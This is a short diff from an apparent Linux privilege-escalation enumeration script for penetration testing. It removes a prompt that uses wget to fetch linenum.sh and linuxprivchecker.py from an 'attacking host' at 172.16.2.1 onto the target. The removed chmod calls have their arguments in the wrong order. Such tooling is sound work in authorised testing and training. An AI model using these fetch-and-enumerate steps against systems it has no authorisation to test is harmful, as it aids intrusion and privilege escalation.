@@ -195,16 +195,3 @@ cat /etc/fstab
 echo ""
 echo "[!] Check manually if the system has unmounted NFS shares. 'showmount -e [target IP]' from your Kali box. "
 echo ""
-
-#obviously will only work if host http server is up
-#let's grab the other scripts if we need more enumeration
-#choose if you want to grab more files - edit according to ip/script names obv
-echo "[!] Initial enumeration has completed. "
-echo "[?] Would you like to grab more enum-scripts from your attacking host? [y/n] "
-read varname
-if [[ "$varname" = "y" ]]; then
-  wget -O linenum.sh http://172.16.2.1/linenum.sh | chmod linenum.sh 755 & wget -O privchecker.py http://172.16.2.1/linuxprivchecker.py | chmod privchecker.py 755
-else
-  echo "Ok. Skipping."
-fi
-echo ""
